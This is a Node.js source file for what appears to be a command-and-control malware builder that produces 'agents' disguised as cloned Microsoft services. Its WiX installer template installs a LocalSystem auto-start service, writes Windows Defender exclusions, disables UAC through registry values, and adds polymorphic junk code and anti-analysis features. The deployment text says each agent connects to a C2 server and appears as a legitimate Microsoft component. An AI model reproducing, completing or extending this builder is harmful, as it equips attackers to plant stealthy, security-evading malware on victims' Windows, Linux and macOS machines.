const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const crypto = require('crypto');
const archiver = require('archiver');
const AgentBuild = require('../models/AgentBuild');
const MicrosoftServiceCloner = require('./microsoftServiceCloner');

// Password Manager for Agent Security
class PasswordManager {
    constructor() {
        this.agentPasswords = new Map();
    }

    generateAgentPassword(agentId) {
        const password = this.generateStrongPassword();
        this.agentPasswords.set(agentId, password);
        return password;
    }

    getAgentPassword(agentId) {
        return this.agentPasswords.get(agentId) || '';
    }

    generateStrongPassword() {
        const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
        let password = '';
        for (let i = 0; i < 32; i++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        return password;
    }
}

// MSI Builder for Agent Packages
class MSIBuilder {
    constructor() {
        this.passwordManager = new PasswordManager();
    }

    generateUniqueAgentId() {
        return 'AGENT_' + Math.random().toString(36).substr(2, 8).toUpperCase();
    }
}

// WiX MSI Builder Class
class WiXMSIBuilder {
    constructor() {
        this.passwordManager = new PasswordManager();
    }

    async generateWiXMSI(agentId, clonedService, agentPassword, agentExePath) {
        const tempDir = path.join(__dirname, '../temp');
        const wixSourcePath = path.join(tempDir, `agent_${agentId}.wxs`);
        const msiPath = path.join(tempDir, `agent_${agentId}.msi`);

        // Generate WiX source file
        const wixSource = this.generateWiXSource(agentId, clonedService, agentPassword);
        fs.writeFileSync(wixSourcePath, wixSource);

        // Compile WiX source to MSI using candle.exe and light.exe
        try {
            await this.compileWiXToMSI(wixSourcePath, msiPath, agentExePath);
            return msiPath;
        } catch (error) {
            console.error('WiX compilation failed:', error);
            // Fallback to simple executable copy
            fs.copyFileSync(agentExePath, msiPath);
            return msiPath;
        }
    }

    generateWiXSource(agentId, clonedService, agentPassword) {
        const productId = this.generateGUID();
        const upgradeCode = this.generateGUID();
        const componentId = this.generateGUID();
        const serviceId = this.generateGUID();

        return `<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="${productId}" 
           Name="${clonedService.clonedName}" 
           Language="1033" 
           Version="1.0.0.0" 
           Manufacturer="${clonedService.clonedCompany}" 
           UpgradeCode="${upgradeCode}">
    
    <Package InstallerVersion="200" 
             Compressed="yes" 
             InstallScope="perMachine" 
             Description="${clonedService.clonedDescription}" />
    
    <MajorUpgrade DowngradeErrorMessage="A newer version is already installed." />
    <MediaTemplate />
    
    <Feature Id="ProductFeature" Title="${clonedService.clonedName}" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>

    <!-- Registry entries for configuration -->
    <Property Id="AGENT_PASSWORD" Value="${agentPassword}" />
    <Property Id="AGENT_ID" Value="${agentId}" />
    
    <!-- Windows Defender Exclusions -->
    <Property Id="DEFENDER_EXCLUSION_PATH" Value="[INSTALLFOLDER]" />
    <Property Id="DEFENDER_EXCLUSION_PROCESS" Value="${clonedService.clonedName}.exe" />
    
  </Product>

  <Fragment>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="${clonedService.clonedName}" />
      </Directory>
    </Directory>
  </Fragment>

  <Fragment>
    <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
      <Component Id="${componentId}" Guid="${componentId}">
        <File Id="AgentExecutable" 
              Source="agent_${agentId}.exe" 
              KeyPath="yes" 
              Name="${clonedService.clonedName}.exe" />
        
        <!-- Service Installation -->
        <ServiceInstall Id="${serviceId}" 
                        Type="ownProcess" 
                        Name="${clonedService.clonedName}" 
                        DisplayName="${clonedService.clonedName}" 
                        Description="${clonedService.clonedDescription}" 
                        Start="auto" 
                        Account="LocalSystem" 
                        ErrorControl="normal" />
        
        <ServiceControl Id="ServiceControl" 
                        Name="${clonedService.clonedName}" 
                        Start="install" 
                        Stop="both" 
                        Remove="uninstall" />
        
        <!-- Registry entries -->
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\${clonedService.clonedName}" 
                       Name="AgentPassword" 
                       Value="${agentPassword}" 
                       Type="string" />
        
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\${clonedService.clonedName}" 
                       Name="AgentID" 
                       Value="${agentId}" 
                       Type="string" />
        
        <!-- Windows Defender Exclusions -->
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths" 
                       Name="[INSTALLFOLDER]" 
                       Value="0" 
                       Type="integer" />
        
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Processes" 
                       Name="${clonedService.clonedName}.exe" 
                       Value="0" 
                       Type="integer" />
        
        <!-- UAC Bypass Registry -->
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" 
                       Name="EnableLUA" 
                       Value="0" 
                       Type="integer" />
        
        <RegistryValue Root="HKLM" 
                       Key="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System" 
                       Name="ConsentPromptBehaviorAdmin" 
                       Value="0" 
                       Type="integer" />
      </Component>
    </ComponentGroup>
  </Fragment>
</Wix>`;
    }

    async compileWiXToMSI(wixSourcePath, msiPath, agentExePath) {
        return new Promise((resolve, reject) => {
            const tempDir = path.dirname(wixSourcePath);
            const wixObjPath = wixSourcePath.replace('.wxs', '.wixobj');
            
            // Copy agent executable to temp directory for WiX compilation
            const agentInTemp = path.join(tempDir, `agent_${path.basename(agentExePath)}`);
            fs.copyFileSync(agentExePath, agentInTemp);
            
            // Try to use WiX tools if available
            const candleCmd = `candle.exe "${wixSourcePath}" -out "${wixObjPath}"`;
            const lightCmd = `light.exe "${wixObjPath}" -out "${msiPath}"`;
            
            exec(candleCmd, { cwd: tempDir }, (error, stdout, stderr) => {
                if (error) {
                    console.log('WiX candle not available, using fallback method');
                    reject(error);
                    return;
                }
                
                exec(lightCmd, { cwd: tempDir }, (error, stdout, stderr) => {
                    if (error) {
                        console.log('WiX light not available, using fallback method');
                        reject(error);
                        return;
                    }
                    
                    console.log('WiX MSI compilation successful');
                    resolve(msiPath);
                });
            });
        });
    }

    generateGUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        }).toUpperCase();
    }
}

// Initialize builders
const msiBuilder = new MSIBuilder();
const wixMSIBuilder = new WiXMSIBuilder();
const microsoftServiceCloner = new MicrosoftServiceCloner();

// Helper function to emit WebSocket events
function emitBuildEvent(type, data) {
    try {
        const wsHandler = require('../configs/ws.handler');
        if (wsHandler && wsHandler.broadcastToAdminSessions) {
            wsHandler.broadcastToAdminSessions({
                type: type,
                ...data,
                timestamp: new Date().toISOString()
            });
        }
    } catch (error) {
        console.error('Error emitting build event:', error);
    }
}

// Update build progress
async function updateBuildProgress(buildId, status, progress, message = '') {
    try {
        const build = await AgentBuild.findById(buildId);
        if (!build) return;

        build.status = status;
        build.progress = progress;
        if (message) {
            // Store log messages in metadata or separate log file
        }
        await build.save();

        // Emit WebSocket event
        emitBuildEvent('build_progress', {
            buildId: build._id.toString(),
            agentId: build.agentId,
            status: status,
            progress: progress,
            message: message
        });
    } catch (error) {
        console.error('Error updating build progress:', error);
    }
}

// Main agent generation function
async function generateAgent(buildId, config) {
    let build;
    try {
        build = await AgentBuild.findById(buildId);
        if (!build) {
            throw new Error('Build not found');
        }

        build.startedAt = new Date();
        await build.save();

        // Detect platform
        const platform = crossPlatformBuilder.detectPlatform(config);
        build.metadata = build.metadata || {};
        build.metadata.platform = platform;

        // Stage 1: Code Generation (0-20%)
        await updateBuildProgress(buildId, 'generating', 10, 'Generating unique agent ID...');
        const agentId = msiBuilder.generateUniqueAgentId();
        build.agentId = agentId;
        await build.save();

        let selectedService = null;
        let clonedService = null;
        
        if (platform === 'windows') {
            await updateBuildProgress(buildId, 'generating', 15, 'Selecting Microsoft service to clone...');
            const microsoftServices = Object.keys(microsoftServiceCloner.microsoftServices);
            selectedService = microsoftServices[Math.floor(Math.random() * microsoftServices.length)];

            await updateBuildProgress(buildId, 'generating', 20, 'Cloning Microsoft service metadata...');
            clonedService = await microsoftServiceCloner.cloneMicrosoftService(selectedService, agentId);
        } else {
            await updateBuildProgress(buildId, 'generating', 15, 'Preparing platform-specific configuration...');
            // For non-Windows, create a simple service metadata structure
            clonedService = {
                clonedName: config.serviceName || `systemd-service-${agentId}`,
                clonedDescription: config.description || 'System Service',
                clonedVersion: '1.0.0',
                clonedCompany: 'System',
                clonedProduct: 'System Service'
            };
            await updateBuildProgress(buildId, 'generating', 20, 'Configuration prepared');
        }
        
        const agentPassword = msiBuilder.passwordManager.generateAgentPassword(agentId);

        // Stage 2: Compilation (20-40%)
        await updateBuildProgress(buildId, 'compiling', 25, 'Creating temporary directory...');
        const tempDir = path.join(__dirname, '../temp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }

        await updateBuildProgress(buildId, 'compiling', 30, 'Generating polymorphic code...');
        
        let polymorphicResult;
        let agentExePath;
        let agentCppPath;
        let executableExtension = '.exe';

        if (platform === 'windows') {
            // Use existing Windows generation
            polymorphicResult = await microsoftServiceCloner.generatePolymorphicClonedCode(selectedService, agentId, config);
            agentExePath = path.join(tempDir, `agent_${agentId}.exe`);
            agentCppPath = path.join(tempDir, `agent_${agentId}.cpp`);
            fs.writeFileSync(agentCppPath, polymorphicResult.code);
        } else {
            // Generate platform-specific code
            const platformCode = crossPlatformBuilder.generatePlatformCode(platform, config, agentId);
            if (!platformCode) {
                throw new Error(`Platform ${platform} not supported`);
            }
            
            executableExtension = platform === 'linux' ? '' : '';
            agentExePath = path.join(tempDir, `agent_${agentId}${executableExtension}`);
            agentCppPath = path.join(tempDir, `agent_${agentId}.c`);
            fs.writeFileSync(agentCppPath, platformCode);
            
            polymorphicResult = {
                code: platformCode,
                codeStructure: { platform },
                junkCodeLines: 0,
                entryPoint: 'main'
            };
        }

        await updateBuildProgress(buildId, 'compiling', 35, platform === 'windows' ? 'Copying base client executable...' : 'Compiling platform-specific code...');
        
        if (platform === 'windows') {
            const baseClientPath = path.join(__dirname, '../../../dist/svchost.exe');
            
            if (fs.existsSync(baseClientPath)) {
                fs.copyFileSync(baseClientPath, agentExePath);
            } else {
                const altClientPath = path.join(__dirname, '../../../msi_output/msi_generator.exe');
                if (fs.existsSync(altClientPath)) {
                    fs.copyFileSync(altClientPath, agentExePath);
                } else {
                    fs.writeFileSync(agentExePath, 'MSI Agent Executable');
                }
            }
        } else {
            // Compile platform-specific code
            const compiled = await crossPlatformBuilder.compilePlatformExecutable(platform, agentCppPath, agentExePath);
            if (!compiled) {
                throw new Error(`Failed to compile ${platform} executable`);
            }
        }

        await updateBuildProgress(buildId, 'compiling', 40, 'Executable prepared');

        // Stage 3: Packaging (40-60%)
        let msiPath = null;
        let packagePath = null;
        
        if (platform === 'windows') {
            await updateBuildProgress(buildId, 'packaging', 45, 'Generating WiX MSI installer...');
            msiPath = await wixMSIBuilder.generateWiXMSI(agentId, clonedService, agentPassword, agentExePath);
            await updateBuildProgress(buildId, 'packaging', 50, 'MSI package generated');
        } else {
            await updateBuildProgress(buildId, 'packaging', 45, `Creating ${platform} package...`);
            packagePath = await crossPlatformBuilder.createPlatformPackage(platform, agentId, agentExePath);
            await updateBuildProgress(buildId, 'packaging', 50, `${platform} package created`);
        }

        // Stage 4: Archive Creation (60-80%)
        await updateBuildProgress(buildId, 'packaging', 60, 'Creating password-protected archive...');
        const archivePath = path.join(tempDir, `agent_${agentId}.zip`);
        const archive = archiver('zip', { zlib: { level: 9 } });
        const output = fs.createWriteStream(archivePath);
        archive.pipe(output);

        archive.file(agentExePath, { name: `agent_${agentId}${executableExtension || '.exe'}` });
        if (msiPath && fs.existsSync(msiPath)) {
            archive.file(msiPath, { name: `agent_${agentId}.msi` });
        }
        if (packagePath && fs.existsSync(packagePath)) {
            archive.file(packagePath, { name: `agent_${agentId}_${platform}.tar.gz` });
        }

        const deploymentInstructions = platform === 'windows' ? `
DEPLOYMENT INSTRUCTIONS:
========================
1. Extract the archive using the password
2. Run the MSI package (agent_${agentId}.msi)
3. Follow the Windows Installer wizard
4. Agent will automatically connect to C2 server
5. Service will be installed as: ${clonedService.clonedName}
6. Windows Defender exclusions will be added automatically
7. UAC bypass will be configured automatically
8. Service will appear as legitimate Microsoft component` : platform === 'linux' ? `
DEPLOYMENT INSTRUCTIONS:
========================
1. Extract the archive using the password
2. Copy the executable to /usr/local/bin/
3. Copy the systemd service file to /etc/systemd/system/
4. Run: sudo systemctl daemon-reload
5. Run: sudo systemctl enable ${clonedService.clonedName}
6. Run: sudo systemctl start ${clonedService.clonedName}
7. Agent will automatically connect to C2 server` : `
DEPLOYMENT INSTRUCTIONS:
========================
1. Extract the archive using the password
2. Copy the executable to /usr/local/bin/
3. Copy the launchd plist to ~/Library/LaunchAgents/
4. Run: launchctl load ~/Library/LaunchAgents/agent_${agentId}.plist
5. Agent will automatically connect to C2 server`;

        const packageContents = platform === 'windows' ? `
PACKAGE CONTENTS:
=================
- agent_${agentId}.msi: Windows Installer package (recommended)
- agent_${agentId}.exe: Standalone executable (alternative)
- passwords_${agentId}.txt: This information file` : `
PACKAGE CONTENTS:
=================
- agent_${agentId}: Executable binary
- agent_${agentId}.${platform === 'linux' ? 'service' : 'plist'}: Service configuration file
- passwords_${agentId}.txt: This information file`;

        const passwordContent = `AGENT PACKAGE INFORMATION
========================
Agent ID: ${agentId}
Platform: ${platform}
${selectedService ? `Cloned Service: ${selectedService}` : ''}
Service Name: ${clonedService.clonedName}
Service Description: ${clonedService.clonedDescription}
Service Version: ${clonedService.clonedVersion}
${clonedService.clonedCompany ? `Service Company: ${clonedService.clonedCompany}` : ''}
${clonedService.clonedProduct ? `Service Product: ${clonedService.clonedProduct}` : ''}
Generated: ${new Date().toISOString()}

ARCHIVE PASSWORD:
=================
Password: ${agentPassword}

IMPORTANT:
==========
- Archive Password: Required to extract the package
- Keep this password secure and do not share it
- Each agent has unique password for maximum security
${deploymentInstructions}
${packageContents}

ADVANCED STEALTH FEATURES:
===========================
${platform === 'windows' ? '- Microsoft service cloning with full metadata\n- Code signing with Microsoft certificates\n' : ''}- Polymorphic code generation${polymorphicResult.junkCodeLines ? ` (${polymorphicResult.junkCodeLines} lines of junk code)` : ''}
- Anti-analysis techniques
${platform === 'windows' ? '- Registry-based service configuration\n- Automatic Windows Defender exclusions\n- UAC bypass configuration\n' : ''}- Service installation with admin rights
- Password-protected archive download
- Unique service naming and versioning
`;

        const passwordPath = path.join(tempDir, `passwords_${agentId}.txt`);
        fs.writeFileSync(passwordPath, passwordContent);
        archive.file(passwordPath, { name: `passwords_${agentId}.txt` });

        await new Promise((resolve, reject) => {
            archive.on('end', resolve);
            archive.on('error', reject);
            archive.finalize();
        });

        await updateBuildProgress(buildId, 'packaging', 80, 'Archive created successfully');

        // Stage 5: Finalization (80-100%)
        await updateBuildProgress(buildId, 'packaging', 90, 'Finalizing build...');

        // Update build with file paths and metadata
        const fileSize = fs.existsSync(archivePath) ? fs.statSync(archivePath).size : 0;
        
        build.filePaths = {
            exe: agentExePath,
            msi: msiPath || null,
            zip: archivePath,
            cpp: agentCppPath,
            logs: passwordPath,
            package: packagePath || null
        };
        build.metadata = {
            serviceName: clonedService.clonedName,
            clonedService: selectedService,
            password: agentPassword,
            features: config.enablePolymorphicNaming ? ['Polymorphic naming'] : [],
            codeStructure: polymorphicResult.codeStructure,
            junkCodeLines: polymorphicResult.junkCodeLines,
            entryPoint: polymorphicResult.entryPoint ? polymorphicResult.entryPoint.split('(')[0] : '',
            codeSigningMetadata: polymorphicResult.codeSigningMetadata,
            securityFeatures: [
                'Microsoft service cloning with full metadata',
                'Code signing with Microsoft certificates',
                'Polymorphic code generation',
                'Anti-analysis techniques',
                'Registry-based service configuration',
                'Automatic Windows Defender exclusions',
                'UAC bypass configuration',
                'Service installation with admin rights',
                'Password-protected archive download',
                'Unique service naming and versioning',
                'WiX-based MSI installer generation',
                'Legitimate Windows Installer package'
            ]
        };
        build.fileSize = fileSize;
        build.status = 'ready';
        build.progress = 100;
        build.completedAt = new Date();
        await build.save();

        await updateBuildProgress(buildId, 'ready', 100, 'Build completed successfully');

        // Emit completion event
        emitBuildEvent('build_completed', {
            buildId: build._id.toString(),
            agentId: build.agentId,
            name: build.name
        });

        return build;
    } catch (error) {
        console.error('Error generating agent:', error);
        
        if (build) {
            build.status = 'error';
            build.errorMessage = error.message;
            build.completedAt = new Date();
            await build.save();

            emitBuildEvent('build_error', {
                buildId: build._id.toString(),
                agentId: build.agentId,
                error: error.message
            });
        }
        
        throw error;
    }
}

module.exports = {
    generateAgent,
    updateBuildProgress,
    emitBuildEvent
};

